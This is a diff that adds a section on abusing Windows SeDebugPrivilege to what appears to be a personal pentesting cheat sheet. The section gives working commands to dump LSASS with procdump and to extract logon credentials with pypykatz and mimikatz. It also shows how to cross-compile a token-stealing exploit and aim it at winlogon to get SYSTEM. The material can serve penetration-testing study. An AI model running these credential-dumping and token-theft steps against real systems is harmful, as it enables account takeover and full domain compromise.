@@ -1912,5 +1912,55 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
 
 ---------------------
 
+### Exploiting SeDebug privilege
+
+----------------------
+
+- SeDebugPrivilege is one of the most dangerous rights an attacker can inherit on a Windows host. It grants a user the ability to open, read, and write the memory of any process on the system — including the Local Security Authority Subsystem Service (LSASS), the process responsible for caching credentials of every user currently logged on. Once a low-privileged domain account is granted this right, the path to full domain compromise becomes short: dump LSASS, extract secrets, and pivot as an administrator — or borrow the token of any SYSTEM process on the machine and skip the credential recovery step entirely.
+- First method, using [procmon.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) and  `pypykatz`-:
+- Upload it-:
+
+<img width="1012" height="236" alt="image" src="https://github.com/user-attachments/assets/dab68523-e6c3-436f-b05b-02bf56d64403" />
+
+- Run this-:
+
+```cmd
+./procdump.exe -accepteula -ma lsass.exe lsass.dmp
+download lsass.dmp
+```
+
+<img width="1012" height="858" alt="image" src="https://github.com/user-attachments/assets/cd419c71-dce6-4a1a-a924-6693bb29eec2" />
+
+- Finally with pypykatz:
+
+```bash
+pypykatz lsa minidump lsass.dmp
+```
+
+<img width="1441" height="934" alt="image" src="https://github.com/user-attachments/assets/0a3b393b-678b-4c8b-af13-03c8e61fa876" />
+
+- Using mimkatz.exe-:
+
+```cmd
+./mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
+```
+
+- Sedebug exploit-:
+- Compiling it-:
+
+```bash
+#Compiling cpp to exe on linux
+sudo apt update
+sudo apt install g++-mingw-w64-x86-64
+#I was trying to compile sedebug for a shitty windows 2019 server
+x86_64-w64-mingw32-g++ -static -O2 -o sebug.exe sedebug.cpp
+```
+
+- Find the pid for winlogon with `ps winlogon` and run `./sebug.exe [pid] [program and arguments]`-:
+
+<img width="1001" height="286" alt="image" src="https://github.com/user-attachments/assets/ee526607-a33f-481b-8844-f0ce84c10b59" />
+
+- 
+
 
 
